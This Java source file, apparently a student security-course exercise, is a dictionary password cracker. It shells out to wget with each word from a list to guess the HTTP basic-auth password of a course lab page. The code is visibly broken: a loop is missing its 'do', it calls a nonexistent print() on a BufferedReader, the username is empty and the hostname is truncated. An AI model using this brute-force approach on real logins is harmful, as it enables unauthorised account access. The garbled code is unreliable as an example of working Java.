import java.io.*;
import java.net.*;
import java.net.HttpURLConnection;
import javax.net.*;
import java.security.cert.*;

public class Dictionary
{
	public static void main(String[] args)
	{
		BufferedReader in = null;
		boolean found = true;
		String word = null;
		String cmd = null;
		Runtime run = Runtime.getRuntime();
		Process pro = null;
		BufferedReader inLine = null;



		String str = null;
		URLConnection connection = null;

		try
		{
			FileReader reader = new FileReader("words");
			in = new BufferedReader(reader);
			System.out.println(" cracking....");
			
			{
				found = true;
				word = new String(in.readLine());

				cmd = "wget --http-user= --http-passwd="+word +" http://sec-crack.cs.rmit.edu./SEC/2/index.php";

				pro = run.exec(cmd);
				inLine = new BufferedReader(new InputStreamReader(pro.getErrorStream()));


				if((str=inLine.readLine())!=null)
				{

					while ((str=inLine.readLine())!=null)
					{
						if (str.endsWith("Required"))
						{

							found = false;
						}

					}
				}






				run.gc();
			}
			while (!found);





		}
		catch (FileNotFoundException exc)
		{
			System.out.println(exc);
		}
		catch (IOException exc)
		{
			System.out.println(exc);
		}
        catch (NullPointerException ex)
        {
            System.out.println(word);
        }
		finally
		{
			try
			{
				if (in!= null)
				{
					in.print();
				}
			}
			catch (IOException e) {}
		}
		if (found == true)
			System.out.println("The password is :" + word);
        else
            System.out.println("NOT FOUND!");
	}
}